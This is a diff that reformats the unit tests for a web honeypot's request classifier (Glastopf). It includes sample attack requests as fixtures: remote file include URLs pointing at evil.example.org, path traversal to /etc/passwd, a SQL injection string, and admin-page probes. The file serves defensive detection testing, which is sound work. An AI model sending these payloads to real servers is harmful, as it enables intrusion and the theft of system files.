@@ -32,7 +32,7 @@ class TestClassifier(unittest.TestCase):
 
     def setUp(self):
         self.tmpdir = tempfile.mkdtemp()
-        data_dir = os.path.join(self.tmpdir, 'data')
+        data_dir = os.path.join(self.tmpdir, "data")
         GlastopfHoneypot.prepare_environment(self.tmpdir)
         self.requestClassifier = request_classifier.Classifier(data_dir)
 
@@ -44,110 +44,140 @@ class TestClassifier(unittest.TestCase):
         """Objective: Test classifier for robots.txt requests
         Input: HTTPRequest with an robots.txt GET request
         Expected Response: matched pattern to robots
-        Note: """
+        Note:"""
 
-        httphandler = HTTPHandler('GET /robots.txt HTTP/1.0', None)
+        httphandler = HTTPHandler("GET /robots.txt HTTP/1.0", None)
 
         matched_pattern = self.requestClassifier.classify_request(httphandler)
-        self.assertTrue(matched_pattern == 'robots', '{0} did not match expected pattern'.format(matched_pattern))
+        self.assertTrue(
+            matched_pattern == "robots",
+            "{0} did not match expected pattern".format(matched_pattern),
+        )
 
     def test_rfi_classifier(self):
         """Objective: Test classifier for RFI requests
         Input: HTTPRequest with different kind of remote file includes attempts
         Expected Response: matched pattern to rfi
-        Note: """
+        Note:"""
 
-        intput_paths = ('/index.php?file=http://evil.example.org/t.txt?',
-                        '/index.php?file=%20http://evil.example.org/t.txt?',
-                        '/index.php?file=https://evil.example.org/t.txt?',
-                        '/index.php?file=ftp://evil.example.org/t.txt?,'
-                        '/index.php?file=ftps://evil.example.org/t.txt?',
-                        're/test.jsp?r=%22http://www.gogole.it/')
+        intput_paths = (
+            "/index.php?file=http://evil.example.org/t.txt?",
+            "/index.php?file=%20http://evil.example.org/t.txt?",
+            "/index.php?file=https://evil.example.org/t.txt?",
+            "/index.php?file=ftp://evil.example.org/t.txt?,"
+            "/index.php?file=ftps://evil.example.org/t.txt?",
+            "re/test.jsp?r=%22http://www.gogole.it/",
+        )
 
         for path in intput_paths:
-            request = 'GET {0} HTTP/1.0'.format(path)
+            request = "GET {0} HTTP/1.0".format(path)
             http_handler = HTTPHandler(request, None)
             matched_pattern = self.requestClassifier.classify_request(http_handler)
-            self.assertTrue(matched_pattern == 'rfi', '{0} did not match expected pattern'.format(matched_pattern))
+            self.assertTrue(
+                matched_pattern == "rfi",
+                "{0} did not match expected pattern".format(matched_pattern),
+            )
 
     def test_lfi_classifier(self):
         """Objective: Test classifier for LFI requests
         Input: HTTPRequest with different kind of local file includes attempts
         Expected Response: matched pattern to rfi
-        Note: """
+        Note:"""
 
-        intput_paths = ('/index.php?file=../../../../../../etc/passwd',
-                        '/index.php?file=../../../../../../etc/passwd%00')
+        intput_paths = (
+            "/index.php?file=../../../../../../etc/passwd",
+            "/index.php?file=../../../../../../etc/passwd%00",
+        )
 
         for path in intput_paths:
-            request = 'GET {0} HTTP/1.0'.format(path)
+            request = "GET {0} HTTP/1.0".format(path)
             http_handler = HTTPHandler(request, None)
             matched_pattern = self.requestClassifier.classify_request(http_handler)
-            self.assertTrue(matched_pattern == 'lfi', '{0} did not match expected pattern'.format(matched_pattern))
+            self.assertTrue(
+                matched_pattern == "lfi",
+                "{0} did not match expected pattern".format(matched_pattern),
+            )
 
     def test_phpmyadmin_classifier(self):
         """Objective: Test classifier for phpmyadmin requests
         Input: HTTPRequest with a generic reference to phpmyadmin paths
         Expected Response: matched pattern to phpmyadmin
-        Note: """
+        Note:"""
 
-        intput_paths = ('/phpmyadmin/',
-                        '/phpMyadmin/',
-                        '/pma/',
-                        '/PMA',
-                        '/phpMyAdmin-2.8.2/')
+        intput_paths = (
+            "/phpmyadmin/",
+            "/phpMyadmin/",
+            "/pma/",
+            "/PMA",
+            "/phpMyAdmin-2.8.2/",
+        )
 
         for path in intput_paths:
-            request = 'GET {0} HTTP/1.0'.format(path)
+            request = "GET {0} HTTP/1.0".format(path)
             http_handler = HTTPHandler(request, None)
             matched_pattern = self.requestClassifier.classify_request(http_handler)
-            self.assertTrue(matched_pattern == 'phpmyadmin', '{0} did not match expected pattern'.format(matched_pattern))
+            self.assertTrue(
+                matched_pattern == "phpmyadmin",
+                "{0} did not match expected pattern".format(matched_pattern),
+            )
 
     def test_sqli_classifier(self):
         """Objective: Test classifier for SQL Injection requests
         Input: HTTPRequest with a generic sql injection attempt
         Expected Response: matched pattern to sqli
-        Note: """
+        Note:"""
 
         intput_paths = ('/index.php?id=anything"%20OR%20"x"="x";',)
 
         for path in intput_paths:
-            request = 'GET {0} HTTP/1.0'.format(path)
+            request = "GET {0} HTTP/1.0".format(path)
             http_handler = HTTPHandler(request, None)
             matched_pattern = self.requestClassifier.classify_request(http_handler)
-            self.assertTrue(matched_pattern == 'sqli', '{0} did not match expected pattern'.format(matched_pattern))
+            self.assertTrue(
+                matched_pattern == "sqli",
+                "{0} did not match expected pattern".format(matched_pattern),
+            )
 
     def test_login_classifier(self):
         """Objective: Test classifier for login requests
         Input: HTTPRequest with a generic authentication login attempt
         Expected Response: matched pattern to login
-        Note: """
+        Note:"""
 
-        intput_paths = ('/login',)
+        intput_paths = ("/login",)
 
         for path in intput_paths:
-            request = 'GET {0} HTTP/1.0'.format(path)
+            request = "GET {0} HTTP/1.0".format(path)
             http_handler = HTTPHandler(request, None)
             matched_pattern = self.requestClassifier.classify_request(http_handler)
-            self.assertTrue(matched_pattern == 'login', '{0} did not match expected pattern'.format(matched_pattern))
+            self.assertTrue(
+                matched_pattern == "login",
+                "{0} did not match expected pattern".format(matched_pattern),
+            )
 
     def test_phpinfo_classifier(self):
         """Objective: Test classifier for phpinfo debug/test requests
         Input: HTTPRequest with an attempt to discover a generic phpinfo test page
         Expected Response: matched pattern to phpinfo
-        Note: """
+        Note:"""
 
-        intput_paths = ('/phpinfo.php?ss',
-                        '/phpinfo.php',
-                        '/info.php',
-                        '/info.php?page',
-                        '/phpinfo.html')
+        intput_paths = (
+            "/phpinfo.php?ss",
+            "/phpinfo.php",
+            "/info.php",
+            "/info.php?page",
+            "/phpinfo.html",
+        )
 
         for path in intput_paths:
-            request = 'GET {0} HTTP/1.0'.format(path)
+            request = "GET {0} HTTP/1.0".format(path)
             http_handler = HTTPHandler(request, None)
             matched_pattern = self.requestClassifier.classify_request(http_handler)
-            self.assertTrue(matched_pattern == 'phpinfo', '{0} did not match expected pattern'.format(matched_pattern))
+            self.assertTrue(
+                matched_pattern == "phpinfo",
+                "{0} did not match expected pattern".format(matched_pattern),
+            )
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     unittest.main()
